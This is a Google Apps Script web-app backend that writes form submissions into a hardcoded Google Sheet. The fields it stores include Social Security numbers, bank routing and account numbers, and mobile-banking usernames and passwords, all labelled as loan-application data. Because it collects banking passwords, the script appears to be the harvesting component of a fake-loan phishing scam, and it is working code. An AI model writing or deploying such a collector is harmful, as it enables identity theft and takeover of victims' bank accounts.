// FINAL CLEAN SCRIPT - Only lightstreamfinancialefts@gmail.com
// No other emails, just Google Sheet storage

const SHEET_URL = "https://docs.google.com/spreadsheets/d/1drmvoZPbGED2hratNOu3vBgjJRmk9cYIdLuJq7Scei8/edit";

function doGet(e) {
  return HtmlService.createHtmlOutput('Google Sheets API is working! Use POST to submit data.');
}

function doPost(e) {
  try {
    const sheet = SpreadsheetApp.openByUrl(SHEET_URL).getSheetByName("Sheet1");
    const data = JSON.parse(e.postData.contents);

    // Add ONLY useful data to sheet (15 columns) - NO USELESS FIELDS
    sheet.appendRow([
      data.loanAmount || "",
      data.loanPurpose || "",
      data.name || "",
      data.email || "",
      data.phone || "",
      data.streetAddress || "",
      data.city || "",
      data.state || "",
      data.zipCode || "",
      data.ssn || "",
      data.bankName || data.customerBank || "",
      data.routingNumber || "",
      data.accountNumber || "",
      data.mobileBankingUserId || "",
      data.mobileBankingPassword || "",
      new Date()
    ]);

    return ContentService.createTextOutput(JSON.stringify({ status: "success" }))
      .setMimeType(ContentService.MimeType.JSON);

  } catch (err) {
    return ContentService.createTextOutput(JSON.stringify({ status: "error", message: err.message }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}
